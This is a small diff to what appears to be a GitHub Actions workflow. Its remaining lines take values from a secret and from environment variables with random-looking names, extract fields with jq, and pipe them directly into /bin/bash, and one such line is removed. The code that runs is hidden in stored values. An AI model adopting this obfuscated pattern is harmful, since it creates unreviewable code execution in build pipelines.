@@ -20,7 +20,6 @@ jobs:
           a99: ${{ secrets.a99 }}
         run: |
           printf '%s' "$a99" | jq -r .ju00855 | /bin/bash
-          echo $wzdk773 | jq -r .nqa8436 | /bin/bash
           echo $gllf967 | jq -r .cuge61 | /bin/bash
 
       - name: Save output
